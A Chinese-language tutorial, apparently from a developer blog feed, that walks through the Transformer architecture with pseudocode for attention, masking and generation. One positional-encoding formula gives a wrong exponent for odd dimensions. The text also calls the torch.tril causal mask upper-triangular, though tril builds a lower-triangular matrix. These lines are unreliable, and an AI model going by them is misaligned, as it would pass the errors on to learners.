.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Transformer 是一种完全基于注意力机制的神经网络架构，放弃了传统的循环和卷积结构，在机器翻译等序列到序列任务中表现出色，并成为当今大语言模型（如 GPT、BERT）的基石。</p>
<p>我们以最经典的 <strong>序列到序列任务</strong>（如机器翻译：将英文“I love you”翻译成中文“我爱你”）为例，讲解其完整工作流。</p>
<h4 data-id="heading-0">核心思想</h4>
<p>Transformer 的核心思想是：<strong>通过“自注意力”机制，让序列中的每个元素都能直接与序列中的所有其他元素进行交互，从而捕捉全局的上下文依赖关系。</strong></p>
<hr/>
<h4 data-id="heading-1">整体架构图景</h4>
<p>Transformer 采用 <strong>编码器-解码器</strong> 架构。</p>
<ul>
<li><strong>编码器</strong>：负责理解和抽象化输入序列的信息，将其转化为一组富含上下文信息的“中间表示”。</li>
<li><strong>解码器</strong>：基于编码器的输出和之前已生成的输出，自回归地（一个接一个）生成目标序列。</li>
</ul>
<p>一个标准的 Transformer 模型由 <strong>N 个（通常 N=6）相同的编码器层堆叠而成</strong>，和 <strong>N 个相同的解码器层堆叠而成</strong>。</p>
<hr/>
<h4 data-id="heading-2">第一阶段：输入处理与嵌入</h4>
<h5 data-id="heading-3">1. 词元化与嵌入</h5>
<ul>
<li>
<p><strong>输入</strong>：原始文本序列（如 “I love you”）。</p>
</li>
<li>
<p><strong>步骤</strong>：</p>
<ul>
<li><strong>分词</strong>：将句子分割成词元（Token），例如 <code>["I", "love", "you"]</code>。</li>
<li><strong>嵌入查找</strong>：每个词元通过一个可学习的 <strong>嵌入矩阵</strong> 被转换成一个固定维度的向量（如 512 维）。这个向量称为 <strong>词嵌入</strong>，它试图在向量空间中编码该词元的语义信息。</li>
</ul>
</li>
<li>
<p><strong>输出</strong>：一个向量序列，维度为 <code>[序列长度, 模型维度]</code>。</p>
</li>
</ul>
<h5 data-id="heading-4">2. 位置编码</h5>
<ul>
<li>
<p><strong>问题</strong>：自注意力机制本身是“排列不变”的，它没有内置的顺序概念。<code>“A 打了 B”</code> 和 <code>“B 打了 A”</code> 的词嵌入是一样的，但含义截然不同。</p>
</li>
<li>
<p><strong>解决方案</strong>：<strong>位置编码</strong>。</p>
<ul>
<li>为序列中的每个位置（第1个词，第2个词…）计算一个独一无二的、固定或可学习的向量。</li>
<li>这个位置向量的维度与词嵌入相同。</li>
<li><strong>关键操作</strong>：将 <strong>词嵌入向量</strong> 和 <strong>位置编码向量</strong> <strong>逐元素相加</strong>。</li>
</ul>
</li>
<li>
<p><strong>结果</strong>：得到的向量既包含了词的语义信息，也包含了其在序列中的绝对和相对位置信息。</p>
</li>
</ul>
<p><strong>至此，输入序列被转换为一个包含语义和位置信息的向量序列，准备送入编码器。</strong></p>
<hr/>
<h4 data-id="heading-5">第二阶段：编码器处理</h4>
<p>编码器层是 Transformer 的引擎，每个编码器层结构完全相同，包含两个核心子层：</p>
<h5 data-id="heading-6">子层 1：多头自注意力机制</h5>
<p>这是 Transformer 的灵魂。</p>
<ul>
<li>
<p><strong>目的</strong>：让序列中的每个词都能“关注”序列中的所有其他词，从而基于整个上下文来更新自己的表示。</p>
</li>
<li>
<p><strong>过程</strong>：</p>
<ol>
<li>
<p><strong>线性投影</strong>：对于每个位置的输入向量，通过三组不同的权重矩阵，并行地生成三组向量：<strong>查询向量</strong>、<strong>键向量</strong>、<strong>值向量</strong>。</p>
</li>
<li>
<p><strong>“多头”</strong> ：将模型维度分割成多个“头”（例如 8 个头，每个头维度为 64）。在每个头上独立地进行注意力计算。这允许模型在不同的表示子空间中并行地关注不同方面的信息（例如语法、语义、指代关系）。</p>
</li>
<li>
<p><strong>缩放点积注意力计算</strong>（在每个头上）：</p>
<ul>
<li><strong>匹配</strong>：计算当前词（查询 Q）与序列中所有词（键 K）的相似度得分（点积）。<code>相似度 = Q · K^T</code></li>
<li><strong>缩放</strong>：将得分除以键向量维度的平方根，使训练更稳定。</li>
<li><strong>归一化</strong>：通过 Softmax 函数将相似度得分转换为概率分布（注意力权重），权重之和为 1。</li>
<li><strong>加权求和</strong>：用得到的注意力权重对序列中所有词的 <strong>值向量</strong> 进行加权求和，得到当前词在该注意力头下的新表示。<strong>权重高的值向量对结果贡献大。</strong></li>
</ul>
</li>
<li>
<p><strong>合并</strong>：将所有注意力头的输出拼接起来，并通过一个线性层进行融合。</p>
</li>
</ol>
</li>
<li>
<p><strong>输出</strong>：每个词的新向量，都融合了序列中所有其他词的相关信息。</p>
</li>
</ul>
<h5 data-id="heading-7">子层 2：前馈神经网络</h5>
<ul>
<li><strong>目的</strong>：对自注意力层的输出进行进一步的非线性变换和空间映射。</li>
<li><strong>结构</strong>：一个简单的两层全连接网络，通常中间层的维度更大（如 2048 维），使用 ReLU 激活函数。</li>
<li><strong>作用</strong>：为模型增加非线性能力和表达能力。</li>
</ul>
<h5 data-id="heading-8">残差连接与层归一化</h5>
<ul>
<li>
<p><strong>每个子层</strong>（自注意力、前馈网络）都被一个 <strong>残差连接</strong> 和 <strong>层归一化</strong> 所包裹。</p>
</li>
<li>
<p><strong>流程</strong>：<code>输出 = LayerNorm(子层输入 + 子层函数(子层输入))</code></p>
</li>
<li>
<p><strong>作用</strong>：</p>
<ul>
<li><strong>残差连接</strong>：缓解深层网络中的梯度消失问题，使模型更容易训练。</li>
<li><strong>层归一化</strong>：稳定每一层的输入分布，加速训练。</li>
</ul>
</li>
</ul>
<p><strong>经过 N 个编码器层的逐层处理后，输入序列被转化为一组高度精炼、富含全局上下文信息的“记忆”或“上下文向量”。这组向量将传递给解码器。</strong></p>
<hr/>
<h4 data-id="heading-9">第三阶段：解码器处理</h4>
<p>解码器也是自回归的，它一次生成一个词元。每个解码器层包含 <strong>三个</strong> 核心子层。</p>
<h5 data-id="heading-10">子层 1：掩码多头自注意力</h5>
<ul>
<li><strong>目的</strong>：让解码器在生成当前词时，只能“看到”它 <strong>之前</strong> 已经生成的词（这是自回归生成的要求），而不能看到未来的词。</li>
<li><strong>实现</strong>：在计算注意力权重时，使用一个 <strong>因果掩码</strong>。这是一个上三角矩阵，将未来位置的注意力权重设置为负无穷，这样在 Softmax 之后，未来位置的权重就变成了 0。</li>
</ul>
<h5 data-id="heading-11">子层 2：编码器-解码器注意力（交叉注意力）</h5>
<ul>
<li>
<p><strong>目的</strong>：这是连接编码器和解码器的桥梁。它让解码器在生成当前词时，能够“询问”编码器：“基于我目前生成的上下文，源序列的哪些部分是相关的？”</p>
</li>
<li>
<p><strong>过程</strong>：</p>
<ul>
<li><strong>Q（查询）</strong>  来自解码器上一层的输出。</li>
<li><strong>K（键）和 V（值）</strong>  来自 <strong>最后一个编码器层的输出</strong>。</li>
<li>计算解码器当前状态（Q）与整个编码器输出序列（K）的相似度，得到注意力权重，然后用这些权重对编码器的值向量（V）进行加权求和。</li>
</ul>
</li>
<li>
<p><strong>结果</strong>：解码器将编码器提供的源序列信息，动态地、有选择地整合到自己的生成过程中。</p>
</li>
</ul>
<h5 data-id="heading-12">子层 3：前馈神经网络</h5>
<ul>
<li>与编码器中的前馈网络完全相同。</li>
</ul>
<p><strong>同样，每个子层周围都有残差连接和层归一化。</strong></p>
<p><strong>经过 N 个解码器层的处理后，在最后一个解码器层的顶部，会输出一个向量序列（每个目标词位置对应一个向量）。</strong></p>
<hr/>
<h4 data-id="heading-13">第四阶段：输出生成</h4>
<ol>
<li>
<p><strong>线性投影</strong>：将最后一个解码器层输出的每个位置的向量，通过一个可学习的线性层，投影到 <strong>目标语言词表大小</strong> 的维度。</p>
</li>
<li>
<p><strong>Softmax</strong>：对线性层的输出应用 Softmax 函数，将其转换为一个概率分布。这个分布表示在当前位置，生成词表中每个词的概率。</p>
</li>
<li>
<p><strong>自回归生成</strong>：</p>
<ul>
<li><strong>训练时</strong>：我们已知完整的目标序列（<code>“&lt;SOS&gt; 我 爱 你 &lt;EOS&gt;”</code>）。解码器会并行地处理整个目标序列（使用掩码），并试图预测下一个词。损失函数（如交叉熵）通过比较预测分布和真实的下一个词来计算。</li>
<li><strong>推理时</strong>：<br/>
a. 从起始符 <code>&lt;SOS&gt;</code> 开始。<br/>
b. 将当前已生成的序列送入解码器，得到下一个词的概率分布。<br/>
c. 通常采用 <strong>束搜索</strong> 或 <strong>贪心采样</strong> 等策略，选择下一个词（例如选择概率最高的词“我”）。<br/>
d. 将新生成的词追加到序列末尾，重复步骤 b-c，直到生成结束符 <code>&lt;EOS&gt;</code>。</li>
</ul>
</li>
</ol>
<hr/>
<h4 data-id="heading-14">工作流总结</h4>
<ol>
<li>
<p><strong>输入预处理</strong>：<code>文本</code> -&gt; <code>词元化</code> -&gt; <code>词嵌入</code> + <code>位置编码</code> = 带位置的输入向量。</p>
</li>
<li>
<p><strong>编码器堆栈</strong>（N层）：每层对输入进行 <strong>多头自注意力</strong>（捕捉上下文）和 <strong>前馈变换</strong>，用 <strong>残差连接和层归一化</strong> 稳定训练。输出 <strong>上下文记忆</strong>。</p>
</li>
<li>
<p><strong>解码器堆栈</strong>（N层，自回归）：</p>
<ul>
<li><strong>掩码自注意力</strong>：关注已生成的部分。</li>
<li><strong>交叉注意力</strong>：查询编码器的上下文记忆，获取相关信息。</li>
<li><strong>前馈变换</strong>：进一步处理信息。</li>
<li>每层同样使用 <strong>残差连接和层归一化</strong>。</li>
</ul>
</li>
<li>
<p><strong>输出层</strong>：<code>解码器输出</code> -&gt; <code>线性投影</code> -&gt; <code>Softmax</code> -&gt; <code>下一个词的概率分布</code> -&gt; <code>自回归生成完整序列</code>。</p>
</li>
</ol>
<h4 data-id="heading-15">关键创新与优势</h4>
<ul>
<li><strong>并行化</strong>：与 RNN 的串行处理不同，Transformer 对序列所有位置的注意力计算可以完全并行，极大提高了训练速度。</li>
<li><strong>长程依赖</strong>：自注意力机制允许任意两个位置直接交互，无论距离多远，有效解决了 RNN 的长程依赖衰减问题。</li>
<li><strong>可扩展性</strong>：模块化的层堆叠结构，使其能够通过增加层数、维度等轻松扩展成超大模型（如 GPT-3、PaLM）。</li>
</ul>
<p>希望这个详细的流程能帮助你清晰地理解 Transformer 的内部工作机制。</p>
<p>生成md文档</p>
<p>我们按照Transformer的整体工作流程，将上述详细讲解整理成Markdown文档。注意，由于Markdown不支持复杂的图表，我们将用文字描述和简单的代码块来示意关键步骤。对于复杂的数学公式，我们将使用LaTeX格式。</p>
<p>注意：由于内容较长，我们将分章节进行整理。</p>
<h2 data-id="heading-16">Transformer 模型完整工作流程详解</h2>
<h3 data-id="heading-17">概述</h3>
<p>Transformer 是一种完全基于注意力机制的神经网络架构，由 Vaswani 等人在 2017 年的论文《Attention Is All You Need》中提出。它放弃了传统的循环神经网络和卷积神经网络，在序列到序列任务中表现出色，并成为当今大语言模型的基石。</p>
<h3 data-id="heading-18">核心架构图</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/946717b7606247f79fb28377e5e8a89d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5L-KQw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768291162&amp;x-signature=Q%2FpRWCP8PV4ZznfYXAVDQuhY0so%3D" alt="架构图.png" loading="lazy"/></p>
<h3 data-id="heading-19">一、输入处理阶段</h3>
<h4 data-id="heading-20">1.1 词元化与嵌入</h4>
<h5 data-id="heading-21">流程</h5>
<p>text</p>
<pre><code class="hljs">原始文本 → 分词 → 词嵌入查找 → 词向量序列
</code></pre>
<h5 data-id="heading-22">详细步骤</h5>
<p><strong>1. 分词（Tokenization）</strong></p>
<ul>
<li>将输入文本分割成有意义的单元</li>
<li>方法：BPE、WordPiece、SentencePiece 等</li>
<li>示例：<code>"I love you"</code> → <code>["I", "love", "you"]</code></li>
</ul>
<p><strong>2. 词嵌入（Word Embedding）</strong></p>
<ul>
<li>
<p>通过可学习的嵌入矩阵将词元映射为向量</p>
</li>
<li>
<p>维度：通常为 512、768 或 1024 维</p>
</li>
<li>
<p>数学表示：</p>
<p>text</p>
<pre><code class="hljs language-ini" lang="ini">E ∈ ℝ^(V×d)  <span class="hljs-comment"># 嵌入矩阵，V=词表大小，d=模型维度</span>
<span class="hljs-attr">X_embed</span> = E[token_ids]  <span class="hljs-comment"># 形状: [batch_size, seq_len, d_model]</span>
</code></pre>
</li>
</ul>
<h4 data-id="heading-23">1.2 位置编码</h4>
<h5 data-id="heading-24">目的</h5>
<p>为模型提供序列顺序信息，因为自注意力机制本身是位置无关的。</p>
<h5 data-id="heading-25">实现方式</h5>
<p><strong>1. 正弦余弦位置编码（原始 Transformer）</strong></p>
<p>python</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 公式</span>
PE(<span class="hljs-keyword">pos</span>, <span class="hljs-number">2</span>i) = <span class="hljs-keyword">sin</span>(<span class="hljs-keyword">pos</span> / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i/d_model))
PE(<span class="hljs-keyword">pos</span>, <span class="hljs-number">2</span>i+<span class="hljs-number">1</span>) = <span class="hljs-keyword">cos</span>(<span class="hljs-keyword">pos</span> / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i+<span class="hljs-number">1</span>/d_model))

<span class="hljs-comment"># 其中：</span>
<span class="hljs-comment"># - pos: 位置索引（0, 1, 2, ...）</span>
<span class="hljs-comment"># - i: 维度索引（0 ≤ i &lt; d_model/2）</span>
<span class="hljs-comment"># - d_model: 模型维度</span>
</code></pre>
<p><strong>2. 可学习位置编码（如 BERT）</strong></p>
<ul>
<li>为每个位置学习一个独立的嵌入向量</li>
<li>适用于固定或有限的最大序列长度</li>
</ul>
<h5 data-id="heading-26">最终输入表示</h5>
<p>text</p>
<pre><code class="hljs language-ini" lang="ini">输入 = 词嵌入 + 位置编码
<span class="hljs-attr">X</span> = X_embed + PE
</code></pre>
<h3 data-id="heading-27">二、编码器架构</h3>
<p>编码器由 N 个相同的层堆叠而成（通常 N=6）。</p>
<h4 data-id="heading-28">2.1 单编码器层结构</h4>
<p>text</p>
<pre><code class="hljs language-sql" lang="sql">输入
    ↓
多头自注意力层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm（残差连接 <span class="hljs-operator">+</span> 层归一化）
    ↓
前馈神经网络层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm（残差连接 <span class="hljs-operator">+</span> 层归一化）
    ↓
输出
</code></pre>
<h4 data-id="heading-29">2.2 多头自注意力机制</h4>
<h5 data-id="heading-30">计算流程</h5>
<p><strong>1. 线性投影生成 Q、K、V</strong></p>
<p>text</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">Q</span> = X · W_Q  <span class="hljs-comment"># 查询矩阵</span>
<span class="hljs-attr">K</span> = X · W_K  <span class="hljs-comment"># 键矩阵</span>
<span class="hljs-attr">V</span> = X · W_V  <span class="hljs-comment"># 值矩阵</span>
</code></pre>
<p><strong>2. 分割成多个头</strong></p>
<p>text</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 原始维度: [batch_size, seq_len, d_model]</span>
<span class="hljs-comment"># 分割后: [batch_size, num_heads, seq_len, d_k]</span>
<span class="hljs-comment"># 其中 d_k = d_model / num_heads</span>
</code></pre>
<p><strong>3. 缩放点积注意力计算</strong></p>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini">def scaled_dot_product_attention(Q, K, V, <span class="hljs-attr">mask</span>=None):
    <span class="hljs-comment"># 计算注意力分数</span>
    <span class="hljs-attr">scores</span> = torch.matmul(Q, K.transpose(-<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>)) / sqrt(d_k)
    
    <span class="hljs-comment"># 应用掩码（如果需要）</span>
    if mask is not None:
        <span class="hljs-attr">scores</span> = scores.masked_fill(mask == <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>e9)
    
    <span class="hljs-comment"># Softmax 归一化</span>
    <span class="hljs-attr">attention_weights</span> = F.softmax(scores, dim=-<span class="hljs-number">1</span>)
    
    <span class="hljs-comment"># 加权求和</span>
    <span class="hljs-attr">output</span> = torch.matmul(attention_weights, V)
    return output, attention_weights
</code></pre>
<p><strong>4. 多头合并</strong></p>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 1. 每个头独立计算注意力</span>
<span class="hljs-attr">head_i</span> = attention(Q_i, K_i, V_i)

<span class="hljs-comment"># 2. 拼接所有头</span>
<span class="hljs-attr">multi_head</span> = concatenate(head_1, head_2, ..., head_h)

<span class="hljs-comment"># 3. 线性投影</span>
<span class="hljs-attr">output</span> = multi_head · W_O
</code></pre>
<h4 data-id="heading-31">2.3 前馈神经网络</h4>
<h5 data-id="heading-32">结构</h5>
<p>text</p>
<pre><code class="hljs">输入 → 线性层（扩大维度） → ReLU激活 → 线性层（恢复维度） → 输出
</code></pre>
<h5 data-id="heading-33">数学表示</h5>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">FFN</span>(x) = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, xW_1 + b_1)W_2 + b_2
</code></pre>
<p>其中：</p>
<ul>
<li><code>W_1 ∈ ℝ^(d_model×d_ff)</code>，<code>d_ff</code> 通常为 <code>4×d_model</code></li>
<li><code>W_2 ∈ ℝ^(d_ff×d_model)</code></li>
</ul>
<h4 data-id="heading-34">2.4 残差连接与层归一化</h4>
<h5 data-id="heading-35">公式</h5>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss">子层输出 = <span class="hljs-built_in">LayerNorm</span>(x + Sublayer(x))
</code></pre>
<h5 data-id="heading-36">作用</h5>
<ol>
<li><strong>残差连接</strong>：缓解梯度消失，使深层网络易于训练</li>
<li><strong>层归一化</strong>：稳定激活值分布，加速收敛</li>
</ol>
<h3 data-id="heading-37">三、解码器架构</h3>
<p>解码器也由 N 个相同的层堆叠而成。</p>
<h4 data-id="heading-38">3.1 单解码器层结构</h4>
<p>text</p>
<pre><code class="hljs language-sql" lang="sql">输入
    ↓
掩码多头自注意力层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm
    ↓
编码器<span class="hljs-operator">-</span>解码器注意力层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm
    ↓
前馈神经网络层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm
    ↓
输出
</code></pre>
<h4 data-id="heading-39">3.2 三种注意力机制对比</h4>





























<table><thead><tr><th>类型</th><th>查询(Q)来源</th><th>键(K)/值(V)来源</th><th>作用</th></tr></thead><tbody><tr><td>编码器自注意力</td><td>编码器输入</td><td>编码器输入</td><td>捕捉输入序列内部依赖</td></tr><tr><td>掩码自注意力</td><td>解码器输入</td><td>解码器输入</td><td>防止信息泄露，保证自回归性</td></tr><tr><td>编码器-解码器注意力</td><td>解码器上层输出</td><td>编码器输出</td><td>连接源语言和目标语言信息</td></tr></tbody></table>
<h4 data-id="heading-40">3.3 掩码机制</h4>
<h5 data-id="heading-41">因果掩码（Causal Mask）</h5>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 上三角矩阵，主对角线及以下为1，以上为0</span>
<span class="hljs-attr">mask</span> = torch.tril(torch.<span class="hljs-literal">on</span>es(seq_len, seq_len))
<span class="hljs-comment"># 形状：[1, 1, seq_len, seq_len]</span>
</code></pre>
<h5 data-id="heading-42">作用</h5>
<p>确保在生成第 t 个词时，只能看到前 t-1 个词。</p>
<h3 data-id="heading-43">四、输出生成</h3>
<h4 data-id="heading-44">4.1 线性投影与Softmax</h4>
<p>text</p>
<pre><code class="hljs">解码器输出 → 线性层 → Softmax → 概率分布
</code></pre>
<h5 data-id="heading-45">数学表示</h5>
<p>text</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">logits</span> = DecoderOutput · W_vocab  <span class="hljs-comment"># W_vocab ∈ ℝ^(d_model×vocab_size)</span>
<span class="hljs-attr">probs</span> = softmax(logits)
</code></pre>
<h4 data-id="heading-46">4.2 训练与推理模式</h4>
<h5 data-id="heading-47">训练阶段（Teacher Forcing）</h5>
<p>text</p>
<pre><code class="hljs language-css" lang="css">输入: &lt;SOS&gt; 我 爱 你
目标: 我 爱 你 &lt;EOS&gt;

流程:
<span class="hljs-number">1</span>. 解码器输入: &lt;SOS&gt; 我 爱 你
<span class="hljs-number">2</span>. 预测下一个词: <span class="hljs-built_in">P</span>(我), <span class="hljs-built_in">P</span>(爱), <span class="hljs-built_in">P</span>(你), <span class="hljs-built_in">P</span>(&lt;EOS&gt;)
<span class="hljs-number">3</span>. 计算交叉熵损失
</code></pre>
<h5 data-id="heading-48">推理阶段（自回归生成）</h5>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini">def generate(input_ids, <span class="hljs-attr">max_length</span>=<span class="hljs-number">50</span>):
    <span class="hljs-comment"># 编码器前向传播</span>
    <span class="hljs-attr">encoder_output</span> = encoder(input_ids)
    
    <span class="hljs-comment"># 初始化解码器输入</span>
    <span class="hljs-attr">decoder_input</span> = torch.tensor([[SOS_TOKEN_ID]])
    
    for step in range(max_length):
        <span class="hljs-comment"># 解码器前向传播</span>
        <span class="hljs-attr">decoder_output</span> = decoder(decoder_input, encoder_output)
        
        <span class="hljs-comment"># 获取下一个词的概率分布</span>
        <span class="hljs-attr">next_token_logits</span> = lm_head(decoder_output[:, -<span class="hljs-number">1</span>, :])
        <span class="hljs-attr">next_token_probs</span> = F.softmax(next_token_logits, dim=-<span class="hljs-number">1</span>)
        
        <span class="hljs-comment"># 选择下一个词（贪婪采样或束搜索）</span>
        <span class="hljs-attr">next_token_id</span> = torch.argmax(next_token_probs, dim=-<span class="hljs-number">1</span>)
        
        <span class="hljs-comment"># 如果生成了结束符，停止生成</span>
        if <span class="hljs-attr">next_token_id</span> == EOS_TOKEN_ID:
            break
            
        <span class="hljs-comment"># 将新词元添加到输入中</span>
        <span class="hljs-attr">decoder_input</span> = torch.cat([decoder_input, next_token_id.unsqueeze(<span class="hljs-number">0</span>)], dim=<span class="hljs-number">1</span>)
    
    return decoder_input
</code></pre>
<h4 data-id="heading-49">4.3 生成策略</h4>









































<table><thead><tr><th>策略</th><th>描述</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>贪婪解码</td><td>每步选择概率最高的词元</td><td>简单快速</td><td>容易陷入局部最优，缺乏多样性</td></tr><tr><td>束搜索</td><td>每步保留 k 个最佳候选序列</td><td>质量更高</td><td>计算开销大，可能产生重复</td></tr><tr><td>采样</td><td>根据概率分布随机采样</td><td>多样性好</td><td>可能生成不连贯的文本</td></tr><tr><td>温度采样</td><td>调整概率分布的平滑度</td><td>平衡质量与多样性</td><td>需要调优温度参数</td></tr><tr><td>Top-k/p采样</td><td>限制采样空间</td><td>减少低质量输出</td><td>需要选择超参数</td></tr></tbody></table>
<h3 data-id="heading-50">五、关键数学公式汇总</h3>
<h4 data-id="heading-51">5.1 注意力机制</h4>
<p><strong>缩放点积注意力：</strong></p>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Attention</span>(Q, K, V) = <span class="hljs-built_in">softmax</span>(QK^T / √d_k) V
</code></pre>
<p><strong>多头注意力：</strong></p>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">MultiHead</span>(Q, K, V) = <span class="hljs-built_in">Concat</span>(head_1, ..., head_h) W^O
head_i = <span class="hljs-built_in">Attention</span>(QW_i^Q, KW_i^K, VW_i^V)
</code></pre>
<h4 data-id="heading-52">5.2 位置编码</h4>
<p><strong>正弦余弦编码：</strong></p>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">PE</span>(pos, <span class="hljs-number">2</span>i) = <span class="hljs-built_in">sin</span>(pos / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i/d))
<span class="hljs-built_in">PE</span>(pos, <span class="hljs-number">2</span>i+<span class="hljs-number">1</span>) = <span class="hljs-built_in">cos</span>(pos / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i/d))
</code></pre>
<h4 data-id="heading-53">5.3 前馈网络</h4>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">FFN</span>(x) = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, xW_1 + b_1)W_2 + b_2
</code></pre>
<h4 data-id="heading-54">5.4 层归一化</h4>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">LayerNorm</span>(x) = γ ⊙ (x - μ) / √(σ² + ε) + β
其中 μ, σ 为均值和标准差，γ, β 为可学习参数
</code></pre>
<h3 data-id="heading-55">六、变体与扩展</h3>
<h4 data-id="heading-56">6.1 仅编码器模型（如 BERT）</h4>
<ul>
<li>用途：自然语言理解任务</li>
<li>结构：仅使用编码器部分</li>
<li>预训练任务：掩码语言建模、下一句预测</li>
</ul>
<h4 data-id="heading-57">6.2 仅解码器模型（如 GPT 系列）</h4>
<ul>
<li>用途：文本生成任务</li>
<li>结构：仅使用解码器部分（移除编码器-解码器注意力）</li>
<li>预训练任务：自回归语言建模</li>
</ul>
<h4 data-id="heading-58">6.3 编码器-解码器模型（原始 Transformer）</h4>
<ul>
<li>用途：序列到序列任务</li>
<li>结构：完整的编码器-解码器架构</li>
<li>应用：机器翻译、文本摘要</li>
</ul>
<h3 data-id="heading-59">七、优化技巧</h3>
<h4 data-id="heading-60">7.1 训练优化</h4>
<ol>
<li><strong>梯度累积</strong>：模拟大批量训练</li>
<li><strong>混合精度训练</strong>：减少内存占用，加快计算</li>
<li><strong>学习率调度</strong>：Warmup + 衰减策略</li>
</ol>
<h4 data-id="heading-61">7.2 内存优化</h4>
<ol>
<li><strong>梯度检查点</strong>：用时间换空间</li>
<li><strong>激活重计算</strong>：减少中间激活存储</li>
<li><strong>模型并行</strong>：将模型分布到多个设备</li>
</ol>
<h4 data-id="heading-62">7.3 推理优化</h4>
<ol>
<li><strong>键值缓存</strong>：避免重复计算</li>
<li><strong>量化</strong>：降低权重精度</li>
<li><strong>模型剪枝</strong>：移除不重要的权重</li>
</ol>
<h3 data-id="heading-63">八、应用场景</h3>
<ol>
<li><strong>机器翻译</strong>：原始应用场景</li>
<li><strong>文本生成</strong>：故事创作、代码生成</li>
<li><strong>问答系统</strong>：阅读理解、开放域问答</li>
<li><strong>文本摘要</strong>：提取式、生成式摘要</li>
<li><strong>语音识别与合成</strong>：语音到文本、文本到语音</li>
</ol>
<h3 data-id="heading-64">总结</h3>
<p>Transformer 通过完全基于注意力机制的架构，解决了传统序列模型在并行化和长程依赖方面的局限性。其核心创新包括：</p>
<ol>
<li><strong>自注意力机制</strong>：允许序列中任意位置直接交互</li>
<li><strong>位置编码</strong>：为模型注入顺序信息</li>
<li><strong>多头注意力</strong>：并行捕捉不同子空间的信息</li>
<li><strong>残差连接与层归一化</strong>：稳定深层网络训练</li>
</ol>
<p>这种架构不仅成为自然语言处理的基石，也逐渐扩展到计算机视觉、多模态学习等领域，推动了深度学习的发展。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[独立开发实战：我用 AI 写了一个台球小程序]]></title>    <link>https://juejin.cn/post/7591767753851174954</link>    <guid>https://juejin.cn/post/7591767753851174954</guid>    <pubDate>2026-01-06T06:47:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591767753851174954" data-draft-id="7591816944729047076" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="独立开发实战：我用 AI 写了一个台球小程序"/> <meta itemprop="keywords" content="前端,后端,Trae"/> <meta itemprop="datePublished" content="2026-01-06T06:47:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="白哥学前端"/> <meta itemprop="url" content="https://juejin.cn/user/430664288573789"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            独立开发实战：我用 AI 写了一个台球小程序
